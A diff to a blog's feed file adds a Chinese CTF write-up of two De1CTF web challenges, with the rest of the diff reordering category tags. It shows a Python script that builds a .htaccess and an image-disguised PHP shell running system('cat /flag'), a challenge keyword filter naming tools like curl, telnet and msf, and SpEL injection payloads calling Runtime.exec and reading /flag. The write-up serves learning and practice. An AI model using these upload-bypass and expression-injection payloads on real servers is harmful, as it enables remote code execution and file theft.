@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>De1CTF(复现) web</title>
+      <link href="/2020/05/09/De1CTF-%E5%A4%8D%E7%8E%B0-web/"/>
+      <url>/2020/05/09/De1CTF-%E5%A4%8D%E7%8E%B0-web/</url>
+      
+        <content type="html"><![CDATA[<p>我是笨比，当时两题思路都对！一次没成功就跑出去玩了。。。不过复现学到了好多新知识哈哈哈哈。</p><a id="more"></a><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><p id="div-border-left-red">考点：CGI（我好像是用正常htaccess改后缀做的）PHP短标签</p><p><img src="1.jpg" alt="upload"></p><h3 id="满足两个条件："><a href="#满足两个条件：" class="headerlink" title="满足两个条件："></a>满足两个条件：</h3><ul><li>首先不能包含【perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet】这些内容</li><li>然后还要MIME是image类型才行</li></ul><p>ph的限制的话用短标签来绕过。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">短标签记得在php.ini里面把short_open_tag=<span class="keyword">on</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">我记得是默认开启的</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">简单描述：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?</span>= <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    等价于</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?</span>php echo <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    所以可以构造<span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">'cat /flag'</span>) 来得到flag</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    然后利用.htaccess文件把jpg文件解析成php文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    .htaccess里面的php利用`\`加换行符绕过。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    我的理解：斜杠应该是转义(以前没遇到过，如果我说错了希望能纠正我一下，下次就不会错了。。)</span></pre></td></tr></table></figure><p>生成两个文件的快捷脚本= =</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = b<span class="string">"\n\n#define width 1337\n#define height 1337\n\n"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">def generate_php_file(filename, script):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">'wb'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    phpfile.<span class="built_in">write</span>(script.encode(<span class="string">'utf-16be'</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    phpfile.<span class="built_in">write</span>(SIZE_HEADER)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    phpfile.<span class="built_in">close</span>()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">def generate_htacess():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    htaccess.<span class="built_in">write</span>(SIZE_HEADER)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    htaccess.<span class="built_in">write</span>(b<span class="string">'AddType application/x-httpd-php .jpg\n'</span>)   <span class="comment">##反斜杠和换行自己手动加吧。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    htaccess.<span class="built_in">close</span>()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">generate_htacess()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">generate_php_file(<span class="string">"shell.jpg"</span>, <span class="string">"&lt;?=system('cat /flag');"</span>)</span></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p id="div-border-left-red">考点：spel注入(以前用过这个类，或者他已经被包含进去了。看了好多博文，自己手动试了下，终于知道了。。)</p>这题用的是spring boot的框架，应该算是我最熟悉的框架了。不过我是第一次知道Scanner还有BufferedReader,两个类不仅可以读字符还可以读文件。学到了！~<p>前端是VUE的通过前端计算发送的请求，找到springboot写的接口。<br><img src="2.jpg" alt="springbootAPI"></p><p>那别的Payload会发现他过滤了Runtime,java.lang,getClass,T(,new等字符。(一旦满足过滤就返回Hacker!)<br><a href="https://blog.csdn.net/yiyiwudian/article/details/46522415" target="_blank" rel="noopener">可的类</a><br>收录下一个<a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">师傅</a>收集的常用payload：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="constructor">T(<span class="params">java</span>.<span class="params">lang</span>.Runtime)</span>.get<span class="constructor">Runtime()</span>.exec(<span class="string">"nslookup a.com"</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="constructor">T(Thread)</span>.sleep(<span class="number">10000</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">#this.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">lang</span>.Runtime')</span>.get<span class="constructor">Runtime()</span>.exec('nslookup a.com')</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> java.lang.<span class="constructor">ProcessBuilder(&#123;'<span class="params">nslookup</span> <span class="params">a</span>.<span class="params">com</span>'&#125;)</span>.start<span class="literal">()</span></span></pre></td></tr></table></figure><h3 id="Scanner的payload"><a href="#Scanner的payload" class="headerlink" title="Scanner的payload"></a>Scanner的payload</h3><p>利用Scanner获取，file函数读取/flag里面的内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">New java<span class="selector-class">.util</span>.Scanner(New java<span class="selector-class">.io</span>.File(<span class="string">"/flag"</span>)).next()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">next</span><span class="params">()</span></span>读到空格结束</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">nextLine</span><span class="params">()</span></span>读到回车结束</span></pre></td></tr></table></figure><h3 id="BuffereReader的payload"><a href="#BuffereReader的payload" class="headerlink" title="BuffereReader的payload"></a>BuffereReader的payload</h3><p>利用BufferedReader获取FileReader读取/flag里面的内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">New java<span class="selector-class">.io</span>.BufferedReader(New java<span class="selector-class">.io</span>.FileReader(<span class="string">"/flag"</span>)).readLine()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">read</span><span class="params">()</span></span>只读取一个字符</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">readLine</span><span class="params">()</span></span>读取</span></pre></td></tr></table></figure><p>这题正好查阅了很多资料。以前上课走神，没理解的一些东西，正好弄懂了<del>~</del><br><img src="3.jpg" alt="BufferedReader和FileReader的关系图，不知道哪里盗过来的，看太多了。。"><br>还有个问题困扰在我心里，为什么BufferedReader不能搭配File用，但是Scanner可以。查了好多资料都没找到原因(难道是抽象类的原因么。)</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank" rel="noopener">MIME类型</a><br><a href="https://www.php.cn/php-weizijiaocheng-415762.html" target="_blank" rel="noopener">PHP短标签</a><br><a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">spel注入</a><br><a href="https://blog.csdn.net/wuxinliulei/article/details/10347729?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">关于BufferedReader 和FileReader</a><br><a href="https://blog.csdn.net/yiyiwudian/article/details/46522415" target="_blank" rel="noopener">Scanner读取与处理</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日常训练 </category>
+          
+          <category> 上传绕过 </category>
+          
+          <category> Sple注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> WEB </tag>
+            
+            <tag> JAVA </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>XSS绕过HTTPonly</title>
       <link href="/2020/05/05/XSS%E7%BB%95%E8%BF%87HTTPonly/"/>
       <url>/2020/05/05/XSS%E7%BB%95%E8%BF%87HTTPonly/</url>
@@ -81,9 +114,9 @@
       
       <categories>
           
-          <category> 日常训练 </category>
-          
           <category> 算法 </category>
+          
+          <category> 日常训练 </category>
           
       </categories>
       
@@ -108,9 +141,9 @@
       
       <categories>
           
-          <category> 日常训练 </category>
-          
           <category> 算法 </category>
+          
+          <category> 日常训练 </category>
           
       </categories>
       
@@ -143,6 +176,8 @@
           
           <category> ASP.NET VIEWSTATE反序列化 </category>
           
+          <category> XSS </category>
+          
           <category> CVE-2020-0688 </category>
           
           <category> vim </category>
@@ -152,8 +187,6 @@
           <category> SSRF </category>
           
           <category> PHP原生类反序列化 </category>
-          
-          <category> XSS </category>
           
           <category> .git泄露 </category>
           
@@ -219,9 +252,9 @@
       
       <categories>
           
-          <category> 日常训练 </category>
-          
           <category> 算法 </category>
+          
+          <category> 日常训练 </category>
           
       </categories>
       
@@ -271,9 +304,9 @@
       
       <categories>
           
-          <category> 日常训练 </category>
-          
           <category> 算法 </category>
+          
+          <category> 日常训练 </category>
           
       </categories>
       
@@ -375,9 +408,9 @@
       
       <categories>
           
-          <category> 日常训练 </category>
-          
           <category> 算法 </category>
+          
+          <category> 日常训练 </category>
           
       </categories>
       
@@ -452,9 +485,9 @@
       
       <categories>
           
-          <category> 日常训练 </category>
-          
           <category> 算法 </category>
+          
+          <category> 日常训练 </category>
           
       </categories>
       
@@ -504,9 +537,9 @@
       
       <categories>
           
-          <category> 日常训练 </category>
-          
           <category> 算法 </category>
+          
+          <category> 日常训练 </category>
           
       </categories>
       
